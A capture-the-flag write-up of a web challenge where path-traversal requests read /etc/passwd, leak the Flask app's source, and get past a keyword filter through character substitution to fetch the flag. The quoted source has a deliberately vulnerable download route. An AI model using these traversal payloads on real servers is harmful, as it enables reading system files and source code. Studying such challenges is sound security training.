# VUCTF2025 Roomba-Rebellion
In this web challenge, we are given a website where we can download log files.

![homepage](https://github.com/TSpeel/writeups/blob/main/VUCTF2025/Roomba-Rebellion/images/homepage.png)

## Initial vulnerability
The site does not seem to have any attack surface other than this download functionality. The most basic attack to try here is path traversal with a payload as follows:
```
GET /download?file=../../../etc/passwd
```
This results in the following response which shows that the path traversal worked!
```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.11.12
Date: Sat, 10 May 2025 15:12:14 GMT
Content-Disposition: inline; filename=passwd
Content-Type: application/octet-stream
Content-Length: 839
Last-Modified: Mon, 28 Apr 2025 00:00:00 GMT
Cache-Control: no-cache
ETag: "1745798400.0-839-2620983797"
Date: Sat, 10 May 2025 15:12:14 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

Now we can try to see if the file system contains a flag:
```
GET /download?file=../../../flag.txt
```
The result however shows that we hit some kind of input filter:
```
HTTP/1.1 400 BAD REQUEST
Server: Werkzeug/3.1.3 Python/3.11.12
Date: Sat, 10 May 2025 15:12:27 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 32
Connection: close

Roomba Error: Hacking DETECTED!!
```
Now the challenge is clear, we have to find a way to bypass this filter.

## Failed attempts
In my initial attempts, I tried some ways to bypass generic filters. I tried url-encoding `flag.txt` to `%66%6c%61%67%2e%74%78%74`, and I also tried double url-encoding it to `%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%34%25%37%38%25%37%34`.
Both these attempts were unsuccessful. 
I then tried to see if I could somehow leak `flag.txt` through file descriptors stored in `/proc/`. In `/proc` I could find some information about the running processes, but I did not manage to leak the flag in this way.

## Leaking `main.py`
While the previous failed attempts did not result in a flag, they did result in some error messages about non-existing files, which showed that the directory we are looking in before traversing is `/app/static`.
We also already knew this is a Python application from the `Server` header in earlier responses.
These clues point to an existing `main.py` file existing in `/app/`.
We can leak this file with the following payload:
```
GET /download?file=../main.py
```
This results in the following response containing the source code:
```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.11.12
Date: Sat, 10 May 2025 15:08:05 GMT
Content-Disposition: inline; filename=main.py
Content-Type: text/x-python; charset=utf-8
Content-Length: 1030
Last-Modified: Sat, 10 May 2025 08:53:06 GMT
Cache-Control: no-cache
ETag: "1746867186.640631-1030-1462110110"
Date: Sat, 10 May 2025 15:08:05 GMT
Connection: close

from flask import Flask, request, send_file, render_template
import os

def filter(filename: str) -> str:
    filename = filename.replace('R', 'f')
    filename = filename.replace('O', 'g')
    filename = filename.replace('O', 'h')
    filename = filename.replace('M', 'x')
    filename = filename.replace('B', 'j')
    filename = filename.replace('A', 'k')
    return filename

app = Flask(__name__)
BASE_DIR = os.path.abspath(os.path.dirname(__file__))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/download')
def download():
    filename = request.args.get('file', '')
    if any(keyword in filename for keyword in ['g.t', 'flag.txt', 'txt', 'flag']):
        return "Roomba Error: Hacking DETECTED!!", 400
    
    filename = filter(filename)
    file_path = os.path.join(BASE_DIR, 'static', filename)
    try:
        return send_file(file_path)
    except Exception as e:
        return f"Roomba Error: {str(e)}", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

## Bypassing the filter
The leaked `main.py` file not only shows the workings of the input filter as we expected, but also contains another `filter()` function we can use to write characters to bypass the input filter.
We have to write `flag.txt` without the substrings `g.t`, `txt` and `flag` being present. We can do this by replacing `g` and `x` with `O` and `M` respectively. 
`O` and `M` will then be replaced again with `g` and `x` respectively by the `filter()` function after the input filter has been bypassed.
This leaves us with the following request to retrieve the flag:
```
GET /download?file=../flaO.tMt
```
And indeed, we successfully get the flag in the response!
```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.11.12
Date: Sat, 10 May 2025 15:09:45 GMT
Content-Disposition: inline; filename=flag.txt
Content-Type: text/plain; charset=utf-8
Content-Length: 35
Last-Modified: Sat, 10 May 2025 08:53:06 GMT
Cache-Control: no-cache
ETag: "1746867186.640631-35-1594099722"
Date: Sat, 10 May 2025 15:09:45 GMT
Connection: close

VUCTF{REDACTED}
```
